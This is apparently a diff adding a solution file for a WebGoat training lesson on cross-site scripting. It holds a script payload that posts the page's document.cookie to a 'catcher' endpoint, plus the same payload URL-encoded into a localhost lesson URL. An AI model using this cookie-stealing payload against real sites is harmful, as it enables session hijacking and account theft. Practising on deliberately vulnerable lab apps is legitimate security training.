@@ -1,0 +1,11 @@
+<!-- Field exploitable: enter your three digit access code -->
+<!-- payload -->
+<script>
+    $.ajax({
+        type: "POST",
+        url: "catcher?PROPERTY=yes&cookie=" + document.cookie.split("=")[1],
+    });
+</script>
+
+<!-- Encoded url -->
+http://localhost:8090/WebGoat/start.mvc#attack/1406352188/900?field2=222&field1=%3Cscript%3E%0D%0A++++%24.ajax%28%7B%0D%0A++++++++type%3A+%22POST%22%2C%0D%0A++++++++url%3A+%22catcher%3FPROPERTY%3Dyes%26cookie%3D%22+%2B+document.cookie.split%28%22%3D%22%29%5B1%5D%2C%0D%0A++++%7D%29%3B%0D%0A%3C%2Fscript%3E
